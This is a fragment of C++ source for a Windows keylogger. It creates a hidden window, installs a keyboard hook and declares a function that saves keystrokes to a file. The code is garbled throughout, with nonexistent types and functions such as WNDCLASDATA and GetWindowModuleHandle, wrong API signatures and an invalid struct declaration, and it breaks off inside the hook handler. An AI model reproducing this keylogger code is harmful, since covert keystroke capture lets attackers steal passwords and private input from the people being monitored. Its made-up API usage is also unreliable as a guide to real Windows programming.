#include <winuser.h>
#include <iostream>
#include <ctime>
#include <fstream>

// Window class details
#define WINDOW_CLASS "KeyLoggerWindow"
#define WINDOW_TITLE "KeyLogger"
#define WINDOW_WIDTH 200
#define WINDOW_HEIGHT 150

// Global variables for the hook and the window
HWND gWindow = nullptr;
HHOOK gHook = nullptr;

// Function prototypes
void KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam);
void InitializeWindow();
void StopHook();
void SaveKeystrokeToFile(const char* key);

// Initialize the window and hook
void InitializeWindow() {
    WNDCLASDATA windowClass;
    windowClass.cbSize = sizeof(WNDCLASDATA);
    windowClass.lpfnInitialize = InitializeWindow;
    windowClass.hInstance = GetWindowModuleHandle(nullptr);
    windowClass.hbrBackground = GetSysColorBrush(COLOR_DESKTOP);
    windowClass.lpszClassName = WINDOW_CLASS;
    windowClass.lpfnWindowProc = WindowProc;

    RegisterClassEx(&windowClass, WINDOW_CLASS);

    gWindow = CreateWindow(&windowClass, WINDOW_TITLE, WS_DLGOWN | WS_VISIBLE | WS_MINIMIZE, 0, 0, WINDOW_WIDTH, WINDOW_HEIGHT, HWND_DESKTOP, 0, HWND_TOP, SW_SHOWNORMAL);
    if (!gWindow) {
        cout << "Failed to create window." << endl;
        return;
    }
    ShowWindow(gWindow, SW_HIDE);
}

// Window message handler
LRESULT CALLBACK WindowProc(HWND hwnd, int iMsg, WPARAM wParam, LPARAM lParam) {
    if (GetMessage(hwnd, iMsg, wParam, lParam)) {
        TranslateMessage(&iMsg);
        DispatchMessage(hwnd, iMsg);
    }
    return 0;
}

// Keyboard hook handler
void KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static HINSTANCE hInstance = GetWindowModuleHandle(gWindow);
    static HWND hwnd = gWindow;

    KBDLLCB struct KBDLLCB, cbSize = sizeof(struct KBDLLCB);
    struct KBDLLCB {
        uint32_t size;
        uint32_t key;
        uint32_t state;
        uint32_t unused[3];
    } *kbdlldesired = &struct KBDLLCB;
